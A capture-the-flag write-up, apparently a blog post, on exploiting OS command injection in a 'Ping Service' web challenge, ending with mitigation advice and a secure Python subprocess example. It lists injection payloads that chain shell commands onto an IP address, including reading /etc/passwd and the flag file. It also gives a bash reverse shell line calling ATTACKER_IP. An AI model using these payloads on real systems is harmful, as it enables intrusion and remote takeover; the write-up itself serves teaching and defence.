---
layout: post
title: "Command Injection to RCE"
date: 2025-12-25
category: web
tags: [rce, command-injection, system]
---

Exploiting OS command injection vulnerability to achieve remote code execution and retrieve the flag.

## Challenge Overview

**Challenge Name:** Ping Service  
**Difficulty:** Medium  
**Points:** 250  
**Category:** Web Exploitation

A network diagnostic tool that allows users to ping IP addresses but fails to properly sanitize input.

## Enumeration / Recon

The application provides a simple interface to ping hosts:

```
Enter IP address: [INPUT BOX]
[Ping Button]
```

Testing with legitimate IP `8.8.8.8` shows standard ping output:

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=14.2 ms
```

This suggests the backend is directly executing system commands.

## Vulnerability Analysis / Findings

Tested various command injection payloads:

| Payload | Result |
|---------|--------|
| `8.8.8.8; whoami` | Shows username |
| `8.8.8.8 && ls` | Lists directory |
| `8.8.8.8 \| cat /etc/passwd` | Blocked |
| `8.8.8.8$(cat flag.txt)` | Command substitution works |

The backend likely executes:

```bash
ping -c 4 [USER_INPUT]
```

Key findings:
1. No input validation or sanitization
2. Shell metacharacters not filtered
3. Command chaining allowed (`;`, `&&`, `||`)
4. Command substitution with `$()` works
5. Application runs with elevated privileges

## Exploitation / Solution

### Step 1: Enumerate the system

Payload: `8.8.8.8; ls -la`

Output revealed:
```
app.py
flag.txt
requirements.txt
static/
templates/
```

### Step 2: Read the flag

Payload: `8.8.8.8; cat flag.txt`

Successfully retrieved the flag!

### Alternative method using command substitution:

Payload: `$(cat flag.txt).8.8.8.8`

This attempts to resolve the flag content as a hostname, leaking it in the error message.

### Bonus: Reverse shell

For more persistent access, established reverse shell:

```bash
8.8.8.8; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

## Flag

```
Flag{c0mm4nd_1nj3ct10n_p1ng_pwn3d}
```

## Lessons Learned

1. **Input validation** - Never pass user input directly to system commands
2. **Use safe APIs** - Use language-specific libraries instead of shell commands
3. **Whitelist validation** - Only allow expected characters (e.g., IP address format)
4. **Least privilege** - Run applications with minimal required permissions
5. **Sandboxing** - Isolate dangerous operations in restricted environments

### Secure Implementation

```python
# Vulnerable code
import os
ip = request.form['ip']
output = os.system(f'ping -c 4 {ip}')

# Secure code using library
import subprocess
import ipaddress

try:
    # Validate IP address format
    ipaddress.ip_address(ip)
    
    # Use subprocess with argument list (no shell)
    result = subprocess.run(
        ['ping', '-c', '4', ip],
        capture_output=True,
        text=True,
        timeout=5
    )
    output = result.stdout
except ValueError:
    output = "Invalid IP address"
except subprocess.TimeoutExpired:
    output = "Ping timeout"
```
